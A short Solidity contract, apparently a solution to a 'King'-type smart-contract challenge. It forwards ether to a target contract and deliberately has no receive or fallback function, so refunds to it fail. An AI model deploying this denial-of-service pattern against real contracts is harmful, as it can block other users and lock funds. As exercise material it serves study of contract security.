// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    address payable public owner;
    address payable public recipient;

    constructor(address payable _owner,address payable _recipient)  {
        owner = _owner;
        recipient = _recipient;
    }

    function transfer() public payable returns(bool success){
        require(msg.value > 0, "EtherTransfer: No Ether sent");
        (success, ) = recipient.call{ value: msg.value }("");
        require(success, "EtherTransfer: Transfer failed");
    }

    
}
